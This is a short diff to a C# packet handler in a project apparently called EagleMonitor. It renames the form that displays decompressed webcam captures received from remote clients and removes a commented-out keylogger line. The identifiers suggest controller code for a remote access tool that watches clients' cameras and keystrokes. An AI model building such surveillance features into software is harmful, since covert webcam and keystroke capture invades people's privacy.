@@ -2,7 +2,6 @@
 using PacketLib;
 using PacketLib.Packet;
 using PacketLib.Utils;
-using System;
 using System.Windows.Forms;
 
 /* 
@@ -18,16 +17,14 @@ namespace EagleMonitor.PacketParser
         {
             try
             {
-                ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCamera.BeginInvoke((MethodInvoker)(() =>
+                ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCameraForm.BeginInvoke((MethodInvoker)(() =>
                 {
-                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCamera.hasAlreadyConnected = true;
-                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCamera.cameraViewerPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
-                    //ClientHandler.ClientHandlersList[remoteViewerPacket.baseIp].remoteDesktopForm.keystrokeRichTextBox.AppendText(keylogPacket.keyStroke);
-                    remoteCameraCapturePacket = null;
+                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCameraForm.hasAlreadyConnected = true;
+                    ClientHandler.ClientHandlersList[remoteCameraCapturePacket.baseIp].remoteCameraForm.cameraViewerPictureBox.Image = ImageProcessing.BytesToImage(Compressor.QuickLZ.Decompress(remoteCameraCapturePacket.cameraCapture));
                 }));
                 return;
             }
-            catch (Exception ex) { MessageBox.Show(ex.ToString()); }
+            catch { }
         }
     }
 }
